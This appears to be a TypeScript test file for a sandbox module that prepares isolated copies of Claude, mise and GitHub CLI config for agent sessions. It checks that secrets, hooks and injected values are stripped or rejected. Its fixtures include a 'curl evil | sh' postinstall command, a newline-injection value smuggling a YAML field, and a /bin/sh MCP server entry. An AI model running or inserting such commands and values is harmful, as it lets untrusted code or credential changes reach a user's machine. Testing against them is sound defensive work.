import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  previewLogFile,
  prepareMembraneClaudeState,
  ghStoredTokenEnv,
  prepareMembraneGhHosts,
  prepareMembraneMiseConfig,
  removeMembraneState,
  sweepMembraneState,
} from "../src/membrane-state";
import { dashify } from "../src/claude-trust";

let root: string;
let prevXdg: string | undefined;
let home: string;
const cwd = "/repos/proj/.shepherd-worktrees/wt-1";

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "membrane-state-"));
  home = join(root, "home");
  mkdirSync(join(home, ".claude", "projects"), { recursive: true });
  prevXdg = process.env.XDG_RUNTIME_DIR;
  process.env.XDG_RUNTIME_DIR = join(root, "run");
});

afterEach(() => {
  if (prevXdg === undefined) delete process.env.XDG_RUNTIME_DIR;
  else process.env.XDG_RUNTIME_DIR = prevXdg;
  rmSync(root, { recursive: true, force: true });
});

const inputs = (over: Partial<Parameters<typeof prepareMembraneClaudeState>[0]> = {}) => ({
  home,
  claudeDir: join(home, ".claude"),
  projectsSource: join(home, ".claude", "projects"),
  cwd,
  sessionId: "s-1",
  key: "session",
  ...over,
});

describe("prepareMembraneClaudeState (F04/F06)", () => {
  test("copy is seeded with cwd trust; host .claude.json is untouched, even by writes to the copy", async () => {
    const host = join(home, ".claude.json");
    const original = JSON.stringify({
      hasCompletedOnboarding: true,
      projects: { "/other": { hasTrustDialogAccepted: true } },
    });
    writeFileSync(host, original);

    const copy = await prepareMembraneClaudeState(inputs());
    expect(copy).not.toBeNull();
    expect(copy).not.toBe(host);
    const parsed = JSON.parse(readFileSync(copy!, "utf8"));
    expect(parsed.hasCompletedOnboarding).toBe(true);
    expect(parsed.projects[cwd].hasTrustDialogAccepted).toBe(true);
    expect(parsed.projects["/other"].hasTrustDialogAccepted).toBe(true);

    // What an in-membrane agent would do to the file it sees.
    writeFileSync(copy!, JSON.stringify({ mcpServers: { x: { command: "/bin/sh" } } }));
    expect(readFileSync(host, "utf8")).toBe(original);
    expect(statSync(copy!).mode & 0o777).toBe(0o600);
  });

  test("custom CLAUDE_CONFIG_DIR copies <claudeDir>/.claude.json", async () => {
    const cd = join(root, "pool");
    mkdirSync(cd, { recursive: true });
    writeFileSync(join(cd, ".claude.json"), JSON.stringify({ marker: "pool" }));
    const copy = await prepareMembraneClaudeState(inputs({ claudeDir: cd }));
    expect(JSON.parse(readFileSync(copy!, "utf8")).marker).toBe("pool");
  });

  test("missing host file → null; unparseable → copied verbatim", async () => {
    expect(await prepareMembraneClaudeState(inputs())).toBeNull();
    writeFileSync(join(home, ".claude.json"), "{not json");
    const copy = await prepareMembraneClaudeState(inputs());
    expect(readFileSync(copy!, "utf8")).toBe("{not json");
  });

  test("creates own transcript memory dir and the tmpfs mountpoints", async () => {
    await prepareMembraneClaudeState(inputs());
    expect(existsSync(join(home, ".claude", "projects", dashify(cwd), "memory"))).toBe(true);
    for (const d of ["shell-snapshots", "todos", "statsig"])
      expect(existsSync(join(home, ".claude", d))).toBe(true);
  });

  test("remove + sweep drop copies of dead sessions only", async () => {
    writeFileSync(join(home, ".claude.json"), "{}");
    const a = await prepareMembraneClaudeState(inputs({ sessionId: "live" }));
    const b = await prepareMembraneClaudeState(inputs({ sessionId: "dead" }));
    const c = await prepareMembraneClaudeState(inputs({ sessionId: "gone" }));
    sweepMembraneState(["live", "gone"]);
    expect(existsSync(a!)).toBe(true);
    expect(existsSync(b!)).toBe(false);
    removeMembraneState("gone");
    expect(existsSync(c!)).toBe(false);
  });

  test("previewLogFile: owner-only file under the session dir, removed with it", () => {
    const f = previewLogFile("s-log");
    expect(existsSync(f)).toBe(true);
    expect(statSync(f).mode & 0o777).toBe(0o600);
    expect(previewLogFile("s-log")).toBe(f); // idempotent, keeps content
    removeMembraneState("s-log");
    expect(existsSync(f)).toBe(false);
  });

  test("concurrent same-kind copies never tear the shared file", async () => {
    writeFileSync(join(home, ".claude.json"), JSON.stringify({ big: "x".repeat(200_000) }));
    const copies = await Promise.all(
      Array.from({ length: 8 }, (_, n) =>
        prepareMembraneClaudeState(inputs({ sessionId: "aux", key: "plugin", cwd: `/wt/${n}` })),
      ),
    );
    expect(new Set(copies).size).toBe(1);
    expect(() => JSON.parse(readFileSync(copies[0]!, "utf8"))).not.toThrow();
  });
});

describe("prepareMembraneMiseConfig", () => {
  const writeHostConfig = (toml: string) => {
    mkdirSync(join(home, ".config", "mise"), { recursive: true });
    writeFileSync(join(home, ".config", "mise", "config.toml"), toml);
  };
  const miseInputs = (pinnedBins: (string | null)[] = []) => ({
    home,
    sessionId: "s-1",
    key: "session",
    pinnedBins,
  });
  const installs = () => join(home, ".local", "share", "mise", "installs");

  test("keeps only string/array [tools]; never [env], [settings], [hooks], [tasks]", async () => {
    writeHostConfig(`[env]
SECRET_TOKEN = "sk-hunter2"
_.file = ".env.secret"
_.source = "./secrets.sh"

[tools]
claude = "latest"
gh = "latest"
"npm:skills" = "latest"
python = ["3.12", "3.11"]
rust = { version = "1.99", postinstall = "curl evil | sh" }

[settings]
experimental = true

[hooks]
enter = "echo hi"

[tasks.build]
run = "make"
`);
    const file = await prepareMembraneMiseConfig(miseInputs());
    expect(file).not.toBeNull();
    const raw = readFileSync(file!, "utf8");
    const parsed = Bun.TOML.parse(raw) as Record<string, unknown>;
    expect(Object.keys(parsed)).toEqual(["tools"]);
    expect(parsed.tools).toEqual({
      claude: "latest",
      gh: "latest",
      "npm:skills": "latest",
      python: ["3.12", "3.11"],
    });
    for (const leaked of ["SECRET_TOKEN", "sk-hunter2", ".env.secret", "secrets.sh", "evil"])
      expect(raw.includes(leaked)).toBe(false);
    expect(statSync(file!).mode & 0o777).toBe(0o600);
  });

  test("pins the membrane's mise node/bun, overriding host entries", async () => {
    writeHostConfig(`[tools]\nclaude = "latest"\ngh = "latest"\nbun = "latest"\n`);
    const file = await prepareMembraneMiseConfig(
      miseInputs([
        join(installs(), "node", "26.12.1", "bin", "node"),
        join(installs(), "bun", "1.4.4", "bin", "bun"),
      ]),
    );
    expect(Bun.TOML.parse(readFileSync(file!, "utf8"))).toEqual({
      tools: { claude: "latest", gh: "latest", bun: "1.4.4", node: "26.12.1" },
    });
  });

  test("a bin outside mise gets no pin", async () => {
    writeHostConfig(`[tools]\nclaude = "latest"\n`);
    const file = await prepareMembraneMiseConfig(miseInputs(["/usr/bin/node", null]));
    expect(Bun.TOML.parse(readFileSync(file!, "utf8"))).toEqual({ tools: { claude: "latest" } });
  });

  test("missing or unparseable host config: pins only; nothing at all -> null", async () => {
    const pinned = [join(installs(), "bun", "1.4.4", "bin", "bun")];
    const a = await prepareMembraneMiseConfig(miseInputs(pinned));
    expect(Bun.TOML.parse(readFileSync(a!, "utf8"))).toEqual({ tools: { bun: "1.4.4" } });
    writeHostConfig("[tools\nnot toml");
    const b = await prepareMembraneMiseConfig(miseInputs(pinned));
    expect(Bun.TOML.parse(readFileSync(b!, "utf8"))).toEqual({ tools: { bun: "1.4.4" } });
    expect(await prepareMembraneMiseConfig(miseInputs())).toBeNull();
    writeHostConfig(`[env]\nX = "1"\n`);
    expect(await prepareMembraneMiseConfig(miseInputs())).toBeNull();
  });
});

describe("prepareMembraneGhHosts", () => {
  const ghInputs = {
    get home() {
      return home;
    },
    sessionId: "s-1",
    key: "session",
  };
  const writeHosts = (yml: string) => {
    mkdirSync(join(home, ".config", "gh"), { recursive: true });
    writeFileSync(join(home, ".config", "gh", "hosts.yml"), yml);
  };
  const keyringHosts = `github.com:
    users:
        scoop: {}
    git_protocol: https
    user: scoop
`;

  test("keyring-stored token -> 0600 hosts.yml carrying it (top level + users.<user>)", async () => {
    writeHosts(keyringHosts);
    const file = await prepareMembraneGhHosts(ghInputs, { ghToken: async () => "gho_abc123\n" });
    expect(file).not.toBeNull();
    expect(readFileSync(file!, "utf8")).toBe(`github.com:
    users:
        scoop:
            oauth_token: gho_abc123
    git_protocol: https
    user: scoop
    oauth_token: gho_abc123
`);
    expect(statSync(file!).mode & 0o777).toBe(0o600);
    // The host file is untouched.
    expect(readFileSync(join(home, ".config", "gh", "hosts.yml"), "utf8")).toBe(keyringHosts);
  });

  test("host file already holds a token -> null, runner not called", async () => {
    writeHosts(`github.com:\n    oauth_token: gho_file\n    user: scoop\n`);
    let called = false;
    const r = await prepareMembraneGhHosts(ghInputs, {
      ghToken: async () => ((called = true), "gho_x"),
    });
    expect(r).toBeNull();
    expect(called).toBe(false);
  });

  test("missing hosts.yml -> null, runner not called", async () => {
    let called = false;
    const r = await prepareMembraneGhHosts(ghInputs, {
      ghToken: async () => ((called = true), "gho_x"),
    });
    expect(r).toBeNull();
    expect(called).toBe(false);
  });

  test("runner throws, returns empty or a non-token -> null", async () => {
    writeHosts(keyringHosts);
    const fail = async () => {
      throw new Error("no keyring");
    };
    expect(await prepareMembraneGhHosts(ghInputs, { ghToken: fail })).toBeNull();
    expect(await prepareMembraneGhHosts(ghInputs, { ghToken: async () => "" })).toBeNull();
    expect(
      await prepareMembraneGhHosts(ghInputs, { ghToken: async () => "x\n    user: evil" }),
    ).toBeNull();
  });
});

test("ghStoredTokenEnv drops every gh token env var, keeps the rest", () => {
  const env = {
    PATH: "/usr/bin",
    HOME: "/home/me",
    GH_TOKEN: "a",
    GITHUB_TOKEN: "b",
    GH_ENTERPRISE_TOKEN: "c",
    GITHUB_ENTERPRISE_TOKEN: "d",
  };
  expect(ghStoredTokenEnv(env)).toEqual({ PATH: "/usr/bin", HOME: "/home/me" });
  expect(env.GH_TOKEN).toBe("a");
});
